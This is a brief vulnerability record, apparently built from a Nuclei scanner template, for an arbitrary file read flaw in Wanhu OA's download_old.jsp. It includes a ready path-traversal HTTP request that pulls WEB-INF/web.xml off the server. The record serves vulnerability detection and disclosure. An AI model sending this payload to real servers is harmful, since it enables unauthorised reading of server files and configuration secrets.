# Vulnerability: Wanhu OA download_old.jsp - Arbitrary File Read
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`wanhu-download-old-file-read.yaml`)

## Description
There is an arbitrary file download vulnerability in the Wanhu OA download_old.jsp file. An attacker can download any file on the server through the vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
```

